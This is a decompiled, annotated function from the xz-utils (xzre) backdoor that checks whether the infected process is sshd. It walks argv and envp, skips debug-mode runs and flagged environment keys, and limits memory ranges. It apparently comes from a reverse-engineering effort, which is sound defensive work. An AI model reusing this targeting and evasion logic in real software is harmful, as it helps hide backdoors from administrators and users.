// /home/kali/xzre-ghidra/xzregh/103A20_process_is_sshd.c
// Function: process_is_sshd @ 0x103A20
// Calling convention: __stdcall
// Prototype: BOOL __stdcall process_is_sshd(elf_info_t * elf, u8 * stack_end)


/*
 * AutoDoc: Walks the argc/argv/envp layout straight off the caller's stack pointer and only returns TRUE when the snapshot looks exactly like sshd. It first proves stack_end still lives below this frame, sits within 0x2000 bytes, reports 1-32 arguments, and points argv[0] at stack memory that hashes to `/usr/sbin/sshd`. Every remaining argv pointer must stay inside that 0x4000-byte window and avoid `check_argument`'s debug filter. After verifying that argv is NULL-terminated it promotes the walk to envp, requiring stack-resident strings to share the same range while off-stack strings must fall completely inside sshd's writable `.data/.bss` padding window. Any NULL env entry before the sentinel or a non-zero encoded ID aborts the probe.
 */

#include "xzre_types.h"

BOOL process_is_sshd(elf_info_t *elf,u8 *stack_end)

{
  long argc;
  u8 *argv_entry;
  EncodedStringId string_id;
  char *debug_match;
  u8 *bss_padding_base;
  long arg_index;
  char **env_cursor;
  BOOL more_args_to_scan;
  u64 bss_padding_bytes[2];
  
  // AutoDoc: Only trust the caller-provided stack_end pointer when it still sits below this frame and within 0x2000 bytes, so argv/env cursors can't wander into attacker-controlled memory.
  if (((((&stack0xfffffffffffffff8 < stack_end) &&
        ((ulong)((long)stack_end - (long)&stack0xfffffffffffffff8) < 0x2001)) &&
       // AutoDoc: Require 1-32 arguments before touching argv; bogus counts make the in-place stack walk bail out immediately.
       (argc = *(long *)stack_end, argc - 1U < 0x20)) &&
      ((argv_entry = *(u8 **)(stack_end + 8), stack_end < argv_entry && (argv_entry != (u8 *)0x0)))) &&
     ((ulong)((long)argv_entry - (long)stack_end) < 0x4001)) {
    // AutoDoc: Hash argv[0] and insist it decodes to `/usr/sbin/sshd` before scanning any further.
    string_id = get_string_id((char *)argv_entry,(char *)0x0);
    arg_index = 1;
    if (string_id == STR_usr_sbin_sshd) {
      // AutoDoc: Iterate over argv[1..argc-1], checking each pointer range before handing it to the debug filter.
      while (more_args_to_scan = arg_index != argc, arg_index = arg_index + 1, more_args_to_scan) {
        argv_entry = *(u8 **)(stack_end + arg_index * 8);
        if (argv_entry <= stack_end) {
          return FALSE;
        }
        if (argv_entry == (u8 *)0x0) {
          return FALSE;
        }
        if (0x4000 < (ulong)((long)argv_entry - (long)stack_end)) {
          return FALSE;
        }
        // AutoDoc: Let the helper spot strings containing lowercase `d` so sshd's debug modes never reach the hooks.
        debug_match = check_argument((char)*(u16 *)argv_entry,(char *)argv_entry);
        if (debug_match != (char *)0x0) {
          return FALSE;
        }
      }
      // AutoDoc: Switch to envp processing only after confirming argv was NULL-terminated.
      if (*(long *)(stack_end + arg_index * 8) == 0) {
        // AutoDoc: Start envp scanning at envp[0], immediately after the argv NULL sentinel.
        env_cursor = (char **)(stack_end + arg_index * 8 + 8);
        do {
          // AutoDoc: envp is expected to be densely packed; seeing a NULL entry before the sentinel signals a tampered layout and aborts the walk.
          argv_entry = (u8 *)*env_cursor;
          if (argv_entry == (u8 *)0x0) {
            return FALSE;
          }
          // AutoDoc: Stack-relative argv/env pointers must land within 0x4000 bytes of the saved SP; anything else falls through to the `.data` guard.
          if ((argv_entry <= stack_end) || (0x4000 < (ulong)((long)argv_entry - (long)stack_end))) {
            bss_padding_bytes[0] = 0;
            // AutoDoc: When env pointers leave the stack, demand that they reside inside sshd's writable `.data/.bss` padding window.
            bss_padding_base = (u8 *)elf_get_data_segment(elf,bss_padding_bytes,TRUE);
            if (bss_padding_base == (u8 *)0x0) {
              return FALSE;
            }
            // AutoDoc: Even `.data/.bss` env strings need 0x2c bytes of headroom so the loader's staging structure never overruns the cached padding region.
            if (bss_padding_base + bss_padding_bytes[0] < argv_entry + 0x2c) {
              return FALSE;
            }
            if (argv_entry < bss_padding_base) {
              return FALSE;
            }
          }
          // AutoDoc: Known environment keys (non-zero encoded IDs) are treated as hostile and abort the probe immediately.
          string_id = get_string_id((char *)*env_cursor,(char *)0x0);
          if (string_id != 0) {
            return FALSE;
          }
          env_cursor = env_cursor + 1;
        } while (*env_cursor != 0);
        return TRUE;
      }
    }
  }
  return FALSE;
}

